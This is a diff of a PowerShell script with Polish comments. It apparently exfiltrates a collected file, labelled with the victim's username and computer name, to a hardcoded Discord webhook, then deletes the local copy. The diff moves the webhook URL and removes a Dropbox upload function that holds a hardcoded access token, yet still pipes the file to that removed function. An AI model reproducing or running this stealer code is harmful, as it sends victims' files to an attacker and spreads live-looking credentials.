@@ -1,3 +1,6 @@
+$hookurl = 'https://discord.com/api/webhooks/1188761336654598245/nqBAa-TZ2MK3N6gXtGWtaoIsSzI7Oza8KzuCXhu7ESpas18wGqLPNRRYcCUXhZ0vMi71'
+
+
 #Sprawdzanie polaczenia z internetem (jezeli nie ma, wylacza program)
 if (!(Test-Connection -ComputerName www.google.com -Quiet -Count 1)) {
     exit
@@ -108,8 +111,6 @@ param (
     [string]$text 
 )
 
-$hookurl = 'https://discord.com/api/webhooks/1188761336654598245/nqBAa-TZ2MK3N6gXtGWtaoIsSzI7Oza8KzuCXhu7ESpas18wGqLPNRRYcCUXhZ0vMi71'
-
 $Body = @{
   'username' = $env:username
   'content' = $text
@@ -126,38 +127,8 @@ $name_of_message = $file_name + "USERNAME: $env:USERNAME  |  COMPUTERNAME: $env:
 Upload-Discord -file $file_directory -text $name_of_message
 del $file_directory ######
 exit
-   
 
 
-
-#################################      DROPBOX
-
-
-
-
-
-#sl.BsZ45QznJJy5ink9vAFVvUjsEJS-2DTh-DUNA5zvNQn74r4j5ihApkLba_iZv3qCQ3oaEGYkUqzqWgYcHSnQjPENmsXzr7V1VPRBM5GUANZjpxUw6tocHSC0fdqg0Rj6V9v3tpGTJW78vnY
-
-function DropBox-Upload {
-
-[CmdletBinding()]
-param (
-	
-[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
-[Alias("f")]
-[string]$SourceFilePath
-) 
-$DropBoxAccessToken = "sl.BsZ45QznJJy5ink9vAFVvUjsEJS-2DTh-DUNA5zvNQn74r4j5ihApkLba_iZv3qCQ3oaEGYkUqzqWgYcHSnQjPENmsXzr7V1VPRBM5GUANZjpxUw6tocHSC0fdqg0Rj6V9v3tpGTJW78vnY"   # Replace with your DropBox Access Token
-$outputFile = Split-Path $SourceFilePath -leaf
-$TargetFilePath="/$outputFile"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $DropBoxAccessToken
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-}
 
 $file_directory | DropBox-Upload
 
